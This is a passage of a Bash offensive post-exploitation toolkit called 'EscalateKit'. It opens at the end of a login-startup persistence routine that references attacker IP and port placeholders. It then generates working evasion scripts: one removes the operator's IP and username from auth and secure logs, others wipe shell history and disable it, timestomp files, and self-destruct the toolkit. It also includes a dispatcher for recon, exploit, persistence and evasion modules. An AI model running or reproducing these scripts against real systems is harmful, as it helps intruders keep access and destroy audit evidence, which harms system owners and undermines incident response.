
    echo "" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "echo \"[+] Startup file persistence set up\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "echo \"[+] Persistence script: $persist_script\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"
    echo "echo \"[+] Persistence will be triggered on next user login\"" >>"$OUTPUT_DIR/persist/add_startup_file.sh"

    chmod +x "$OUTPUT_DIR/persist/add_startup_file.sh"

    echo "[+] Startup file persistence setup:" >>"$output_file"
    echo "    - Writable configuration files: $writable_configs" >>"$output_file"
    echo "    - Persistence script: $persist_script" >>"$output_file"
    echo "    - Setup script: $OUTPUT_DIR/persist/add_startup_file.sh" >>"$output_file"
    echo "    - Replace ATTACKER_IP and ATTACKER_PORT in the script" >>"$output_file"

    log_message "INFOS" "Startup file persistence setup complete"
    return 0
}

# ----------------------------------------------------------------------
# Evasion Module
# ----------------------------------------------------------------------

evade_cleanup_logs() {
    log_message "INFOS" "Setting up log cleaning capabilities"

    mkdir -p "$OUTPUT_DIR/evade"
    local output_file="$OUTPUT_DIR/evade/cleanup_logs.txt"

    echo "--- Log Cleanup ---" >"$output_file"

    # Check common log files
    echo "[*] Checking for common log files..." >>"$output_file"

    log_files=""

    for log_file in "/var/log/auth.log" "/var/log/secure" "/var/log/syslog" "/var/log/messages" "/var/log/wtmp" "/var/log/btmp" "/var/log/lastlog" "$HOME/.bash_history"; do
        if [ -f "$log_file" ]; then
            echo "[+] Found log file: $log_file" >>"$output_file"
            log_files="$log_files $log_file"
        fi
    done

    if [ -z "$log_files" ]; then
        echo "[-] No common log files found" >>"$output_file"
    fi

    # Create a script to clean up logs
    echo "#!/bin/bash" >"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# Log Cleanup Script" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# This script helps remove traces from log files" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# Usage: ./clean_logs.sh [IP_ADDRESS] [USERNAME]" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "# If no parameters are provided, it will use default values" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "IP_ADDRESS=\"\${1:-$(hostname -I | awk '{print $1}')\"}" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "USERNAME=\"\${2:-$(whoami)}\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "echo \"[*] Starting log cleanup for IP: \$IP_ADDRESS, User: \$USERNAME\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Add log cleaning commands for each log file
    echo "# Clean up common log files" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Auth log
    echo "if [ -f \"/var/log/auth.log\" ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[*] Cleaning /var/log/auth.log...\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    if [ \"\$(id -u)\" -eq 0 ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        # We have root, so we can directly modify the file" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        grep -v \"\$IP_ADDRESS\\|\$USERNAME\" \"/var/log/auth.log\" > \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        cat \"/tmp/.auth.tmp\" > \"/var/log/auth.log\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        rm -f \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[+] Cleaned /var/log/auth.log\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    else" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[-] Root privileges required to modify /var/log/auth.log\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Secure log (RHEL/CentOS)
    echo "if [ -f \"/var/log/secure\" ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[*] Cleaning /var/log/secure...\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    if [ \"\$(id -u)\" -eq 0 ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        grep -v \"\$IP_ADDRESS\\|\$USERNAME\" \"/var/log/secure\" > \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        cat \"/tmp/.secure.tmp\" > \"/var/log/secure\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        rm -f \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[+] Cleaned /var/log/secure\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    else" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "        echo \"[-] Root privileges required to modify /var/log/secure\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Bash history
    echo "# Clean bash history" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "if [ -f \"\$HOME/.bash_history\" ]; then" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[*] Cleaning bash history...\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    > \"\$HOME/.bash_history\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    history -c" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "    echo \"[+] Cleaned bash history\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    # Clean up temporary files
    echo "# Clean up any temporary files we've created" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "rm -f /tmp/.*.tmp 2>/dev/null" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "" >>"$OUTPUT_DIR/evade/clean_logs.sh"
    echo "echo \"[+] Log cleanup complete\"" >>"$OUTPUT_DIR/evade/clean_logs.sh"

    chmod +x "$OUTPUT_DIR/evade/clean_logs.sh"

    echo "[+] Log cleanup script created: $OUTPUT_DIR/evade/clean_logs.sh" >>"$output_file"
    echo "    - Usage: ./clean_logs.sh [IP_ADDRESS] [USERNAME]" >>"$output_file"
    echo "    - This script will remove traces of the specified IP and username from logs" >>"$output_file"
    echo "    - Root privileges are required for cleaning system logs" >>"$output_file"

    log_message "INFOS" "Log cleanup setup complete"
    return 0
}

evade_timestomp() {
    log_message "INFOS" "Setting up timestomping capabilities"

    mkdir -p "$OUTPUT_DIR/evade"
    local output_file="$OUTPUT_DIR/evade/timestomp.txt"

    echo "--- Timestomping ---" >"$output_file"

    # Create a script for timestomping
    echo "#!/bin/bash" >"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Timestomping Script" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# This script helps modify file timestamps to avoid detection" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Usage: ./timestomp.sh TARGET_FILE REFERENCE_FILE" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# If REFERENCE_FILE is not provided, it will use /etc/passwd" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "TARGET_FILE=\"\$1\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "REFERENCE_FILE=\"\${2:-/etc/passwd}\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "if [ -z \"\$TARGET_FILE\" ]; then" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Error: No target file specified\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Usage: \$0 TARGET_FILE [REFERENCE_FILE]\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    exit 1" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "if [ ! -f \"\$TARGET_FILE\" ]; then" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Error: Target file '\$TARGET_FILE' does not exist\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    exit 1" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "if [ ! -f \"\$REFERENCE_FILE\" ]; then" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    echo \"Error: Reference file '\$REFERENCE_FILE' does not exist\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "    exit 1" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"[*] Timestomping \$TARGET_FILE to match \$REFERENCE_FILE...\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Get reference file timestamps" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "REF_STAT=\$(stat -c \"Access: %x\\nModify: %y\\nChange: %z\" \"\$REFERENCE_FILE\")" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"Reference file timestamps:\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\$REF_STAT\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Get target file original timestamps" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "TARGET_STAT=\$(stat -c \"Access: %x\\nModify: %y\\nChange: %z\" \"\$TARGET_FILE\")" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\\nOriginal target file timestamps:\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\$TARGET_STAT\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Apply the timestamps from reference to target" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "touch -r \"\$REFERENCE_FILE\" \"\$TARGET_FILE\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "# Verify the new timestamps" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "NEW_TARGET_STAT=\$(stat -c \"Access: %x\\nModify: %y\\nChange: %z\" \"\$TARGET_FILE\")" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\\nNew target file timestamps:\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\$NEW_TARGET_STAT\"" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "" >>"$OUTPUT_DIR/evade/timestomp.sh"
    echo "echo \"\\n[+] Timestomping complete\"" >>"$OUTPUT_DIR/evade/timestomp.sh"

    chmod +x "$OUTPUT_DIR/evade/timestomp.sh"

    echo "[+] Timestomping script created: $OUTPUT_DIR/evade/timestomp.sh" >>"$output_file"
    echo "    - Usage: ./timestomp.sh TARGET_FILE [REFERENCE_FILE]" >>"$output_file"
    echo "    - This script will modify file timestamps to match a reference file" >>"$output_file"
    echo "    - Default reference file is /etc/passwd" >>"$output_file"

    log_message "INFOS" "Timestomping setup complete"
    return 0
}

evade_cover_tracks() {
    log_message "INFOS" "Setting up track covering capabilities"

    mkdir -p "$OUTPUT_DIR/evade"
    local output_file="$OUTPUT_DIR/evade/cover_tracks.txt"

    echo "--- Cover Tracks ---" >"$output_file"

    # Create a script for covering tracks
    echo "#!/bin/bash" >"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# Cover Tracks Script" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# This script helps clean up traces after privilege escalation" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# Usage: ./cover_tracks.sh [DIRECTORY]" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "# If DIRECTORY is not provided, it will clean up the current directory" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "TARGET_DIR=\"\${1:-.}\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Covering tracks in \$TARGET_DIR...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Clean command history
    echo "# Clean command history" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Cleaning command history...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "history -c" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "> ~/.bash_history" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "if [ -f ~/.zsh_history ]; then > ~/.zsh_history; fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "export HISTFILESIZE=0" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "export HISTSIZE=0" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "unset HISTFILE" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Remove temporary files
    echo "# Remove temporary files" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Removing temporary files...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "find \"\$TARGET_DIR\" -type f -name \"*.tmp\" -exec rm -f {} \\;" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "find \"\$TARGET_DIR\" -type f -name \"*.bak\" -exec rm -f {} \\;" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "find /tmp -type f -user \"\$(whoami)\" -exec rm -f {} \\; 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Clean logs
    echo "# Clean up log files (requires root for system logs)" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Cleaning log files...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "USER_IP=\$(hostname -I | awk '{print \$1}')" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "USER_NAME=\$(whoami)" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "if [ \"\$(id -u)\" -eq 0 ]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # We have root privileges, so we can clean system logs" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[+] Running with root privileges, cleaning system logs\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Auth log" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    if [ -f \"/var/log/auth.log\" ]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        grep -v \"\$USER_IP\\|\$USER_NAME\" \"/var/log/auth.log\" > \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        cat \"/tmp/.auth.tmp\" > \"/var/log/auth.log\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        rm -f \"/tmp/.auth.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Secure log (RHEL/CentOS)" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    if [ -f \"/var/log/secure\" ]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        grep -v \"\$USER_IP\\|\$USER_NAME\" \"/var/log/secure\" > \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        cat \"/tmp/.secure.tmp\" > \"/var/log/secure\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "        rm -f \"/tmp/.secure.tmp\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "else" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[-] Not running with root privileges, skipping system log cleanup\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Clean up current script artifacts
    echo "# Clean up EscalateKit artifacts" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[*] Cleaning up EscalateKit artifacts...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "rm -rf \"\$TARGET_DIR/.escalatekit_results\" 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "rm -rf \"\$TARGET_DIR/.escalatekit_logs\" 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    # Self-destruct option
    echo "# Self-destruct option" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo -n \"[?] Do you want to remove the EscalateKit tool completely? (y/n): \"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "read -r response" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "if [[ \"\$response\" =~ ^[Yy]$ ]]; then" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[*] Self-destructing EscalateKit...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Get the parent directory of the current script" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    SCRIPT_DIR=\$(dirname \"\$(readlink -f \"\$0\")\")" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    PARENT_DIR=\$(dirname \"\$SCRIPT_DIR\")" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    # Remove all EscalateKit files" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    rm -rf \"\$PARENT_DIR\" 2>/dev/null" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    " >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[+] EscalateKit removed\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    echo \"[+] This script will self-destruct in 3 seconds...\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    sleep 3" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    rm -f \"\$0\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "    exit 0" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "fi" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "" >>"$OUTPUT_DIR/evade/cover_tracks.sh"
    echo "echo \"[+] Track covering complete\"" >>"$OUTPUT_DIR/evade/cover_tracks.sh"

    chmod +x "$OUTPUT_DIR/evade/cover_tracks.sh"

    echo "[+] Track covering script created: $OUTPUT_DIR/evade/cover_tracks.sh" >>"$output_file"
    echo "    - Usage: ./cover_tracks.sh [DIRECTORY]" >>"$output_file"
    echo "    - This script will clean up logs, temporary files, and command history" >>"$output_file"
    echo "    - Root privileges are required for cleaning system logs" >>"$output_file"
    echo "    - Includes a self-destruct option to remove all traces of EscalateKit" >>"$output_file"

    log_message "INFOS" "Track covering setup complete"
    return 0
}

# ----------------------------------------------------------------------
# Main Execution Functions
# ----------------------------------------------------------------------

long_operation_warning_start() {
    local module="$1"
    
    if [ "$QUIET_MODE" = false ]; then
        echo -e "\n\e[33m[!] IMPORTANT\e[0m: Some reconnaissance tasks will take time to complete."
        echo -e "    \e[33mDon't panic\e[0m if progress seems slow - this is normal."
        echo -e "    Especially the SUID files scan and writable files search might take several minutes."
        echo -e "    EscalateKit is working hard behind the scenes."
        echo -e "    Now initiating reconnaissance sequence...\n"
    fi
}


run_module() {
    local module="$1"

    case "$module" in
    "shell")
        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Running Shell Enhancement module..."
        fi
        shell_upgrade
        ;;
    "recon")
        
        long_operation_warning_start "recon"

        recon_system_info &
        local pid=$!
        show_loading $pid "Gathering system information"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Running Network reconnaissance..."
        fi
        recon_network &
        pid=$!
        show_loading $pid "Analyzing network configuration"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Checking sudo privileges..."
        fi
        recon_sudo_privileges &
        pid=$!
        show_loading $pid "Checking sudo privileges"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Searching for SUID files..."
        fi
        recon_suid_files &
        pid=$!
        show_loading $pid "Searching for SUID files"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Checking for capabilities..."
        fi
        recon_capabilities &
        pid=$!
        show_loading $pid "Checking for capabilities"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Analyzing cron jobs..."
        fi
        recon_cron_jobs &
        pid=$!
        show_loading $pid "Analyzing cron jobs"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Searching for writable files..."
        fi
        recon_writable_files &
        pid=$!
        show_loading $pid "Searching for writable files"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Checking for kernel exploits..."
        fi
        recon_kernel_exploits &
        pid=$!
        show_loading $pid "Checking for kernel exploits"
        wait $pid
        ;;
    "exploit")
        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Analyzing exploitation paths..."
        fi
        exploit_suggest &
        local pid=$!
        show_loading $pid "Analyzing exploitation paths"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Generating exploit templates..."
        fi
        exploit_generate_templates &
        pid=$!
        show_loading $pid "Generating exploit templates"
        wait $pid
        ;;
    "persist")
        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Setting up SSH key persistence..."
        fi
        persist_ssh_key &
        local pid=$!
        show_loading $pid "Setting up SSH key persistence"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Setting up cron job persistence..."
        fi
        persist_cron_job &
        pid=$!
        show_loading $pid "Setting up cron job persistence"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Setting up systemd service persistence..."
        fi
        persist_systemd_service &
        pid=$!
        show_loading $pid "Setting up systemd service persistence"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Setting up startup file persistence..."
        fi
        persist_startup_file &
        pid=$!
        show_loading $pid "Setting up startup file persistence"
        wait $pid
        ;;
    "evade")
        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Setting up log cleanup capabilities..."
        fi
        evade_cleanup_logs &
        local pid=$!
        show_loading $pid "Setting up log cleanup capabilities"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Setting up timestomping capabilities..."
        fi
        evade_timestomp &
        pid=$!
        show_loading $pid "Setting up timestomping capabilities"
        wait $pid

        if [ "$QUIET_MODE" = false ]; then
            echo -e "\n[*] Setting up track covering capabilities..."
        fi
        evade_cover_tracks &
        pid=$!
        show_loading $pid "Setting up track covering capabilities"
        wait $pid
        ;;
    *)
        log_message "ERROR" "Unknown module: $module"
        return 1
        ;;
    esac

    return 0
}
# Run modules using fork
run_with_fork() {
    local modules=("$@")

    log_message "INFOS" "Running modules using fork"

    for module in "${modules[@]}"; do
        run_module "$module" &
        pid=$!
        pids+=($pid)
        log_message "INFOS" "Started module $module with PID $pid"
    done

    # Wait for all child processes to complete
    for pid in "${pids[@]}"; do
        wait $pid
        log_message "INFOS" "Completed module with PID $pid"
    done

    log_message "INFOS" "All modules completed using fork"
}

# Run modules using threads
run_with_thread() {
    local modules=("$@")

    log_message "INFOS" "Running modules using threads"

    # Since Bash doesn't natively support threads, we use GNU Parallel if available
    if command -v parallel >/dev/null 2>&1; then
        # Create a temporary script for parallel execution
        cat >/tmp/escalatekit_parallel.sh <<'EOF'
#!/bin/bash
MODULE=$1

case "$MODULE" in
    "shell")
        shell_upgrade
        ;;
    "recon")
        recon_system_info
        recon_network
        recon_sudo_privileges
        recon_suid_files
        recon_capabilities
        recon_cron_jobs
        recon_writable_files
        recon_kernel_exploits
        ;;
    "exploit")
        exploit_suggest
        exploit_generate_templates
        ;;
    "persist")
        persist_ssh_key
        persist_cron_job
        persist_systemd_service
        persist_startup_file
        ;;
    "evade")
        evade_cleanup_logs
        evade_timestomp
        evade_cover_tracks
        ;;
    *)
        echo "Unknown module: $MODULE" >&2
        exit 1
        ;;
esac
EOF
        chmod +x /tmp/escalatekit_parallel.sh

        # Execute in parallel
        parallel --will-cite -j0 /tmp/escalatekit_parallel.sh ::: "${modules[@]}"

        # Clean up
        rm -f /tmp/escalatekit_parallel.sh
    else
        # Fallback to fork if GNU Parallel is not available
        log_message "WARN" "GNU Parallel not found, falling back to fork mode"
        run_with_fork "${modules[@]}"
    fi

    log_message "INFOS" "All modules completed using threads"
}

# Run modules using subshell
run_with_subshell() {
    local modules=("$@")

    log_message "INFOS" "Running modules using subshell"

    for module in "${modules[@]}"; do
        (
            log_message "INFOS" "Starting module $module in subshell"
            run_module "$module"
            log_message "INFOS" "Completed module $module in subshell"
        )
    done

    log_message "INFOS" "All modules completed using subshell"
}

# Export results
export_results() {
    local format="$1"

    log_message "INFOS" "Exporting results in format: $format"

    # Create export directory
    mkdir -p "$OUTPUT_DIR/export"

    case "$format" in
    "json")
        export_json
        ;;
    "html")
        export_html
        ;;
    "csv")
        export_csv
        ;;
    *)
        log_message "ERROR" "Unsupported export format: $format"
        return 1
        ;;
    esac

    return 0
}

# Export results in JSON format
export_json() {
    local output_file="$OUTPUT_DIR/export/results.json"

    log_message "INFOS" "Exporting results to JSON: $output_file"

    # Create a simple JSON structure
    echo "{" >"$output_file"
    echo "  \"generated\": \"$(date)\"," >>"$output_file"
    echo "  \"user\": \"$(whoami)\"," >>"$output_file"
    echo "  \"hostname\": \"$(hostname)\"," >>"$output_file"

    # Export modules data
    echo "  \"modules\": {" >>"$output_file"

    # Shell module
    if [ -d "$OUTPUT_DIR/shell" ]; then
        echo "    \"shell\": {" >>"$output_file"
        echo "      \"upgrade_options\": $(cat "$OUTPUT_DIR/shell/upgrade_options.txt" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')" >>"$output_file"
        echo "    }," >>"$output_file"
    fi

    # Recon module
    if [ -d "$OUTPUT_DIR/recon" ]; then
        echo "    \"recon\": {" >>"$output_file"
        for file in "$OUTPUT_DIR/recon/"*.txt; do
            filename=$(basename "$file" .txt)
            echo "      \"$filename\": $(cat "$file" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')," >>"$output_file"
        done
        # Remove trailing comma from last item
        sed -i '$ s/,$//' "$output_file"
        echo "    }," >>"$output_file"
    fi

    # Exploit module
    if [ -d "$OUTPUT_DIR/exploit" ]; then
        echo "    \"exploit\": {" >>"$output_file"
        if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
            echo "      \"suggestions\": $(cat "$OUTPUT_DIR/exploit/suggestions.txt" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')" >>"$output_file"
        fi
        echo "    }," >>"$output_file"
    fi

    # Persist module
    if [ -d "$OUTPUT_DIR/persist" ]; then
        echo "    \"persist\": {" >>"$output_file"
        for file in "$OUTPUT_DIR/persist/"*.txt; do
            filename=$(basename "$file" .txt)
            echo "      \"$filename\": $(cat "$file" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')," >>"$output_file"
        done
        # Remove trailing comma from last item
        sed -i '$ s/,$//' "$output_file"
        echo "    }," >>"$output_file"
    fi

    # Evade module
